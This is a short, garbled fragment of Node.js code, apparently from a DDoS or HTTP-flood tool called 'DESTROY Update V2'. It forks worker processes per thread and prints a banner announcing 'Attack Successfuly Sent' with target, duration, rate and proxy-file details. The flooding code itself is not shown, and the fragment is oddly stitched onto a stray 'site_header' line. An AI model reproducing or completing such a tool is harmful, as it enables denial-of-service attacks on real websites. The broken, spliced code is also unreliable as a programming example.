...
site_header = [
 ...
 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        console.clear();
console.log(`DESTROY Update V2`.green)
console.log("Status : ".red + "[ Attack Successfuly Sent !]".rainbow);
console.log("Target : ".white + "[" + process.argv[2].rainbow + "]");
console.log("Thead : ".blue + "[" + process.argv[5].rainbow + "]");
console.log("Time : ".yellow + "[" + process.argv[3].rainbow + "]");
console.log("Rate : ".red + "[" + process.argv[4].rainbow + "]");
console.log(`[0mProxyFile :[0m ${args.proxyFile} | [36mTotal:[0m ${proxies.length}`);
console.log(`Node :`.blue + " DESTROY Vip : Nguyên Đoàn Trung ⚡️".red);
cluster.fork();
